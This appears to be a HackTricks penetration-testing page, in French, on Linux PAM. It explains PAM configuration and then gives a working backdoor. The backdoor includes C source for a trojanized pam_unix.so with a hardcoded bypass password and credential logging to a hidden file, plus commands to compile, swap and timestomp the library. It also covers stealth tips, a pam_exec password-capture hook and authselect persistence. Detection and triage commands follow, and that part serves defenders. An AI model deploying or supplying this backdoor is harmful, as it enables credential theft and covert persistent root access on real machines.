# PAM - Pluggable Authentication Modules

{{#include ../../banners/hacktricks-training.md}}

### Informations de base

**PAM (Pluggable Authentication Modules)** agit comme un mécanisme de sécurité qui **vérifie l'identité des utilisateurs tentant d'accéder à des services informatiques**, en contrôlant leur accès selon divers critères. Il s'apparente à un gardien numérique, garantissant que seuls les utilisateurs autorisés peuvent utiliser des services spécifiques, tout en pouvant limiter leur utilisation afin d'éviter la surcharge du système.

#### Fichiers de configuration

- Les **systèmes basés sur Solaris et UNIX** utilisent généralement un fichier de configuration central situé dans `/etc/pam.conf`.
- Les **systèmes Linux** privilégient une approche par répertoire, en stockant les configurations propres à chaque service dans `/etc/pam.d`. Par exemple, le fichier de configuration du service login se trouve dans `/etc/pam.d/login`.<sup>[[1]](#references)</sup>

Un exemple de configuration PAM pour le service login pourrait ressembler à ceci :
```
auth required /lib/security/pam_securetty.so
auth required /lib/security/pam_nologin.so
auth sufficient /lib/security/pam_ldap.so
auth required /lib/security/pam_unix_auth.so try_first_pass
account sufficient /lib/security/pam_ldap.so
account required /lib/security/pam_unix_acct.so
password required /lib/security/pam_cracklib.so
password required /lib/security/pam_ldap.so
password required /lib/security/pam_pwdb.so use_first_pass
session required /lib/security/pam_unix_session.so
```
#### **PAM Management Realms**

Ces realms, ou groupes de gestion, incluent **auth**, **account**, **password** et **session**, chacun étant responsable de différents aspects du processus d'authentification et de gestion des sessions :<sup>[[1]](#references)</sup>

- **Auth** : Valide l'identité de l'utilisateur, souvent en demandant un mot de passe.
- **Account** : Gère la vérification du compte, en contrôlant des conditions comme l'appartenance à un groupe ou les restrictions selon l'heure.
- **Password** : Gère les mises à jour du mot de passe, notamment les contrôles de complexité ou la prévention des dictionary attacks.
- **Session** : Gère les actions lors du démarrage ou de la fin d'une session de service, comme le montage de répertoires ou la définition des limites de ressources.

#### **PAM Module Controls**

Les controls dictent la réponse du module en cas de succès ou d'échec, influençant le processus global d'authentification. Ils incluent :<sup>[[1]](#references)</sup>

- **Required** : L'échec d'un module required entraîne finalement un échec, mais seulement après la vérification de tous les modules suivants.
- **Requisite** : Interruption immédiate du processus en cas d'échec.
- **Sufficient** : Le succès permet d'ignorer les vérifications restantes du même realm, sauf si un module suivant échoue.
- **Optional** : N'entraîne un échec que s'il s'agit du seul module de la stack.

#### Offensive Semantics That Matter

Lors du backdooring de PAM, l'**emplacement de la règle insérée** est souvent plus important que le payload lui-même :

- `include` et `substack` récupèrent des règles depuis d'autres fichiers ; modifier `sshd` peut donc n'affecter que SSH, tandis que modifier `system-auth`, `common-auth` ou une autre stack partagée affecte plusieurs services simultanément.
- PAM prend également en charge les controls entre crochets, tels que `[success=1 default=ignore]`. Ceux-ci peuvent être exploités pour **ignorer un ou plusieurs modules** après un custom check réussi, au lieu de remplacer visiblement `pam_unix.so`.
- Le `module-path` peut être **absolu** (`/usr/lib/security/pam_custom.so`) ou **relatif** au répertoire par défaut des modules PAM. Sur les systèmes Linux modernes, les répertoires réels sont souvent `/lib/security`, `/lib64/security`, `/usr/lib/security` ou des chemins multiarch comme `/usr/lib/x86_64-linux-gnu/security`.

À retenir pour l'opérateur : cartographiez toujours le **graphe complet des services** avant d'effectuer un patch. Par exemple, `sshd -> password-auth -> system-auth` sur certaines distros, ou `sshd -> system-remote-login -> system-login -> system-auth` sur d'autres, signifie que le même implant d'une ligne peut se propager bien plus largement que prévu.

#### Example Scenario

Dans une configuration comportant plusieurs modules auth, le processus suit un ordre strict. Si le module `pam_securetty` constate que le terminal de login n'est pas autorisé, les logins root sont bloqués, mais tous les modules sont tout de même traités en raison de son statut "required". Le module `pam_env` définit des variables d'environnement, ce qui peut améliorer l'expérience utilisateur. Les modules `pam_ldap` et `pam_unix` travaillent ensemble pour authentifier l'utilisateur, `pam_unix` tentant d'utiliser un mot de passe fourni précédemment, ce qui améliore l'efficacité et la flexibilité des méthodes d'authentification.


## Backdooring PAM – Hooking `pam_unix.so`

Une technique classique de persistence dans les environnements Linux sensibles consiste à **remplacer la bibliothèque PAM légitime par un drop-in trojanisé**. Comme chaque login SSH / console finit par appeler `pam_unix.so:pam_sm_authenticate()`, quelques lignes de C suffisent pour capturer des credentials ou implémenter un bypass de mot de passe *magic*.<sup>[[2]](#references)</sup>

### Compilation Cheatsheet
<details>
<summary>Sample `pam_unix.so` trojan</summary>
```c
#define _GNU_SOURCE
#include <security/pam_modules.h>
#include <dlfcn.h>
#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>

static int (*orig)(pam_handle_t *, int, int, const char **);
static const char *MAGIC = "Sup3rS3cret!";

int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv) {
const char *user, *pass;
pam_get_user(pamh, &user, NULL);
pam_get_authtok(pamh, PAM_AUTHTOK, &pass, NULL);

/* Magic pwd → immediate success */
if(pass && strcmp(pass, MAGIC) == 0) return PAM_SUCCESS;

/* Credential harvesting */
int fd = open("/usr/bin/.dbus.log", O_WRONLY|O_APPEND|O_CREAT, 0600);
dprintf(fd, "%s:%s\n", user, pass);
close(fd);

/* Fall back to original function */
if(!orig) {
orig = dlsym(RTLD_NEXT, "pam_sm_authenticate");
}
return orig(pamh, flags, argc, argv);
}
```
</details>

Compiler et remplacer furtivement :
```bash
gcc -fPIC -shared -o pam_unix.so trojan_pam.c -ldl -lpam
mv /lib/security/pam_unix.so /lib/security/pam_unix.so.bak
mv pam_unix.so /lib/security/pam_unix.so
chmod 644 /lib/security/pam_unix.so     # keep original perms
touch -r /bin/ls /lib/security/pam_unix.so  # timestomp
```
### Conseils OpSec
1. **Écrasement atomique** – écrivez dans un fichier temporaire, puis utilisez `mv` pour le mettre en place afin d’éviter les bibliothèques partiellement écrites qui bloqueraient SSH.
2. Un emplacement de fichier de log tel que `/usr/bin/.dbus.log` se fond parmi les artefacts légitimes du bureau.
3. Conservez les exports de symboles identiques (`pam_sm_setcred`, etc.) afin d’éviter un mauvais comportement de PAM.

### Détection
* Comparez le MD5/SHA256 de `pam_unix.so` avec celui du package de la distro.
* `rpm -V pam` ou `debsums -s libpam-modules` permettent de repérer les bibliothèques remplacées sans hachage manuel.
* Vérifiez la présence de permissions d’écriture pour tous ou d’un ownership inhabituel sous `/lib/security/`.
* Règle `auditd` : `-w /lib/security/pam_unix.so -p wa -k pam-backdoor`.
* Recherchez les modules inattendus dans les configurations PAM : `grep -R "pam_[a-z].*\.so" /etc/pam.d/ | grep -v pam_unix`.

### Commandes de triage rapide (après une compromission ou pour la threat hunting)
```bash
# 1) Spot alien PAM objects
find /{lib,usr/lib,usr/local/lib}{,64}/security -type f -printf '%p %s %M %u:%g %TY-%Tm-%Td\n' | grep -E 'pam_|libselinux'

# 2) Verify package integrity
command -v rpm >/dev/null && rpm -V pam || debsums -s libpam-modules

# 3) Identify non-packaged PAM modules
for f in /{lib,usr/lib,usr/local/lib}{,64}/security/*.so; do
dpkg -S "$f" >/dev/null 2>&1 || echo "UNPACKAGED: $f";
done

# 4) Look for stealth config edits
grep -R "pam_.*\.so" /etc/pam.d/ | grep -E 'plg|selinux|custom|exec'
```
### Abusing `pam_exec` for persistence
Au lieu de remplacer `pam_unix.so`, une approche plus légère consiste à ajouter une ligne `pam_exec` dans `/etc/pam.d/sshd` afin que chaque connexion SSH lance un implant tout en laissant la stack normale intacte :
```bash
# Run on successful auth and receive the typed password on stdin
auth optional pam_exec.so quiet expose_authtok /usr/local/bin/.ssh_hook.sh
```
`pam_exec` reçoit les métadonnées PAM dans des variables d’environnement telles que `PAM_USER`, `PAM_RHOST`, `PAM_SERVICE`, `PAM_TTY` et `PAM_TYPE`. Avec `expose_authtok`, le helper peut également lire le mot de passe depuis `stdin` pendant les phases `auth` ou `password`. Si vous souhaitez que le helper s’exécute avec l’UID effectif plutôt qu’avec l’UID réel, ajoutez `seteuid`.

Notes pratiques :

- `session optional pam_exec.so ...` est préférable pour les **actions post-login**, telles que la réouverture de sockets ou le lancement d’un daemon détaché.
- `auth optional pam_exec.so quiet expose_authtok ...` est le choix habituel pour la **credential capture**, car il s’exécute avant l’ouverture de la session.
- `type=session` ou `type=auth` peut être utilisé pour limiter l’exécution à une phase PAM spécifique et éviter une double exécution bruyante.

### Surmonter les outils de gestion de la distro : `authselect`

Sur RHEL, CentOS Stream, Fedora et les systèmes dérivés, les modifications directes de fichiers générés tels que `/etc/pam.d/system-auth` ou `/etc/pam.d/password-auth` peuvent être **écrasées par `authselect`**. Pour assurer la persistence, les opérateurs modifient souvent le custom profile actif sous `/etc/authselect/custom/<profile>/`, puis le sélectionnent à nouveau ou l’appliquent.

Flux de travail typique lorsque vous avez root :
```bash
# Inspect the active profile first
authselect current

# If a custom profile already exists, edit its PAM templates instead of system-auth directly
find /etc/authselect/custom -maxdepth 2 -type f \( -name 'system-auth' -o -name 'password-auth' \) -ls

# Re-apply the profile after modifying the template files
authselect select custom/<profile>
```
Cela est important à la fois pour l'offensive et le triage : si `/etc/pam.d/system-auth` contient la bannière `Generated by authselect` et `Do not modify this file manually`, alors le véritable point de persistance peut se trouver sous `/etc/authselect/custom/` plutôt que dans `/etc/pam.d/`.

### Techniques récentes observées sur le terrain

Les rapports récents de 2025 concernant la backdoor Linux **Plague** ont montré la même idée fondamentale poussée plus loin : un composant PAM malveillant avec un **static bypass password**, ainsi que le nettoyage des variables d'environnement liées à SSH et de l'historique du shell (`HISTFILE=/dev/null`) afin de réduire les traces de session après la connexion.<sup>[[3]](#references)</sup> Il s'agit d'un pattern de hunting utile, car la logique de la backdoor peut se trouver dans PAM tandis que les artefacts de furtivité n'apparaissent qu'**après** la réussite de l'authentification.


## References

- [1] [pam.conf(5) / pam.d(5) - Linux-PAM Manual](https://man7.org/linux/man-pages/man5/pam.d.5.html)
- [2] [The Covert Operator's Playbook: Infiltration of Global Telecom Networks - Unit 42](https://unit42.paloaltonetworks.com/infiltration-of-global-telecom-networks/)
- [3] [Nextron Systems - Plague: A Newly Discovered PAM-Based Backdoor for Linux](https://www.nextron-systems.com/2025/08/01/plague-a-newly-discovered-pam-based-backdoor-for-linux/)

{{#include ../../banners/hacktricks-training.md}}
